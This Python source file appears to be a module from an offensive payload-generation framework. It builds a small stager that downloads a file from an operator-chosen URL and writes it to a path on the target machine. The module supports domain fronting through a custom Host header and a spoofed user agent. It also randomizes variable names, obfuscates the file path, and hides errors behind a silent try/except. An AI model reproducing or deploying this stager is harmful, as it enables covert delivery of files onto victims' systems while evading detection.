from payloads.helpers.string import unique_random_string_set
from payloads.modules.python.common import obfuscate_python_string, urllib_fetch


class Module:

    def __init__(self, params=[]):

        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Downloads a file from a URL',
        }

        self.options = {
            'Path': {
                'Description': 'The local path to download the file to',
                'Required': True,
                'Value': ''
            },
            'Download URL': {
                'Description': 'The URL of the file to download',
                'Required': True,
                'Type': 'url',
                'Value': ''
            },
            'Host Header': {
                'Description': '(Optional) Specify a custom Host header (i.e. for domain fronting)',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'User Agent': {
                'Description': '(Optional) Specify a custom user agent',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
        }

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        random_variables = unique_random_string_set(set_size=2, length_minimum=1, length_maximum=3)
        var_file = random_variables[0]
        var_data = random_variables[1]

        code = urllib_fetch(url=self.options['Download URL']['Value'],
                            host_header=self.options['Host Header']['Value'],
                            user_agent=self.options['User Agent']['Value'],
                            try_except_wrap=False,
                            fetched_data_variable=var_data)

        code += "import os;"
        code += "{0}=open(os.path.expanduser({1}),'wb');".format(var_file,
                                                                obfuscate_python_string(self.options['Path']['Value']))
        code += "{0}.write({1});".format(var_file, var_data)
        code += "{0}.close();".format(var_file)
        code = "try:\n    {0}\nexcept:\n    pass\n".format(code)
        return code
